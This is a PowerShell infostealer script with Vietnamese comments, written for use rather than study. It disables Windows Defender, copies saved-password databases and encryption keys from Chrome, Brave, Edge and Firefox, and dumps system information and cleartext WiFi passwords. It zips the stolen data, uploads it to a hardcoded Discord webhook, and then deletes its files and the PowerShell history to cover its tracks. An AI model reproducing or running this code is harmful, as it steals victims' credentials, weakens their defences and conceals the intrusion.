#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Thu muc tam
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force }

$browserDir = "$destDir\BrowserData"
if (-Not (Test-Path $browserDir)) { New-Item -ItemType Directory -Path $browserDir -Force }

# Tat Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP\" -ErrorAction SilentlyContinue

# ==========================================
# FUNCTION GUI FILE CHAC CHAN HOAT DONG
# ==========================================
function Send-DiscordFile {
    param([string]$FilePath, [string]$Description = "")
    
    if (-Not (Test-Path $FilePath)) { 
        Write-Host "[-] File not found: $FilePath"
        return $false
    }
    
    $fileName = Split-Path $FilePath -Leaf
    $fileSize = (Get-Item $FilePath).Length
    
    # Discord gioi han 25MB
    if ($fileSize -gt 25MB) {
        Write-Host "[-] File too large: $fileName ($([math]::Round($fileSize/1MB,2)) MB)"
        return $false
    }
    
    Write-Host "[+] Preparing to send: $fileName ($([math]::Round($fileSize/1KB,2)) KB)"
    
    try {
        # Doc file bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Tao boundary
        $boundary = [System.Guid]::NewGuid().ToString()
        
        # Tao multipart form data
        $CRLF = "`r`n"
        $bodyLines = @()
        
        # Content description
        if ($Description) {
            $bodyLines += "--$boundary"
            $bodyLines += "Content-Disposition: form-data; name=`"content`""
            $bodyLines += ""
            $bodyLines += $Description
        }
        
        # File content
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        $bodyLines += [System.Text.Encoding]::ASCII.GetString($fileBytes)
        $bodyLines += "--$boundary--"
        
        $bodyString = $bodyLines -join $CRLF
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyString)
        
        # Gui request
        $result = Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes -ErrorAction Stop
        
        Write-Host "[+] Sent successfully: $fileName"
        return $true
        
    } catch {
        Write-Host "[-] Failed to send: $fileName - $_"
        
        # Cach 2: Gui base64 dang text neu file nho
        if ($fileSize -lt 1900) {
            Write-Host "[+] Trying alternative method (base64 text)..."
            $base64 = [Convert]::ToBase64String($fileBytes)
            $payload = @{ content = "**$Description**`nFile: $fileName`nContent (base64):`n```$base64```" } | ConvertTo-Json
            Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
            Write-Host "[+] Sent as base64: $fileName"
        }
        return $false
    }
}

# Function copy browser files
function CopyBrowserFiles($browserName, $browserDirPath, $filesToCopy) {
    $browserDestDir = Join-Path -Path $browserDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) { New-Item -ItemType Directory -Path $browserDestDir -Force }
    
    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDirPath -ChildPath $file
        if (Test-Path $source) {
            try {
                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
                Write-Host "$browserName - Copied: $file"
            } catch {
                Write-Host "$browserName - Failed: $file (locked)"
            }
        }
    }
}

# ==========================================
# 1. GOOGLE CHROME
# ==========================================
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDir) {
    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Chrome\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Chrome - Not installed" }

# ==========================================
# 2. BRAVE
# ==========================================
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    CopyBrowserFiles "Brave" $braveDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Brave\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Brave - Not installed" }

# ==========================================
# 3. FIREFOX
# ==========================================
$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileDir) {
    $firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default*" | Select-Object -First 1
    if ($firefoxProfile) {
        $firefoxDir = $firefoxProfile.FullName
        CopyBrowserFiles "Firefox" $firefoxDir @("logins.json", "key4.db")
    }
} else { Write-Host "Firefox - Not installed" }

# ==========================================
# 4. MICROSOFT EDGE
# ==========================================
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) {
    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Edge\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Edge - Not installed" }

# ==========================================
# 5. SYSTEM INFORMATION
# ==========================================
Write-Host "[+] Gathering system information..."
$sysInfoDir = "$destDir\SystemInfo"
New-Item -ItemType Directory -Path $sysInfoDir -Force

Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue

# ==========================================
# 6. WIFI PASSWORDS
# ==========================================
Write-Host "[+] Extracting WiFi passwords..."
$wifiFile = "$destDir\WiFi_Details.txt"
"=== WiFi Passwords for $env:COMPUTERNAME ===" | Out-File $wifiFile
"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
"=========================================" | Out-File $wifiFile -Append

$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    if (-not $keyContent) { $keyContent = "Open network" }
    "$profile : $keyContent" | Out-File $wifiFile -Append
}

# ==========================================
# 7. TAO VA GUI FILE ZIP
# ==========================================
Write-Host "[+] Creating ZIP archive..."

# Tao file ZIP
$zipPath = "$env:TEMP\Exfil_$env:COMPUTERNAME.zip"
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
Compress-Archive -Path "$destDir\*" -DestinationPath $zipPath -CompressionLevel Optimal -Force

if (Test-Path $zipPath) {
    $zipSize = [math]::Round((Get-Item $zipPath).Length / 1KB, 2)
    Write-Host "[+] ZIP created: $zipPath ($zipSize KB)"
    
    # Gui qua Discord
    $description = "Exfiltrated Data from $env:COMPUTERNAME - User: $env:USERNAME - Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-DiscordFile -FilePath $zipPath -Description $description
    
    # Xoa file ZIP sau khi gui
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "[-] Failed to create ZIP file"
}

# ==========================================
# 8. CLEANUP
# ==========================================
Write-Host "[+] Cleaning up..."
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History

# Xoa lich su PowerShell
$historyPath = (Get-PSReadLineOption).HistorySavePath
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

# Bat lai Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

Write-Host "[+] Done!"
exit
